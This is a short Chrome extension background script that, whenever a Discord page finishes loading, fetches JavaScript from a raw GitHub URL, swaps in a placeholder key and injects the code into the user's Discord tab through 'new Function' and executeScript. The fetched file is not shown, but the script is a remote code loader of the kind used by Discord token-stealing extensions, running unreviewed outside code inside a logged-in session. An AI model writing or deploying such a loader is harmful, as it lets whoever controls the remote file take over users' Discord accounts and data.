chrome.webNavigation.onCompleted.addListener(function(details) {
  if (details.url.includes('discord.com')) {
    fetch('https://raw.githubusercontent.com/43a1723/extension-test/main/extension/js/discord.js')
      .then(response => response.text())
      .then(data => {
        const modifiedData = data.replace('%key%', '123');
        
        chrome.scripting.executeScript({
          target: { tabId: details.tabId },
          func: new Function(modifiedData)
        });
      })
      .catch(error => console.error('Error fetching or modifying the script:', error));
  }
}, { url: [{ urlMatches: 'https://*.discord.com/*' }] });
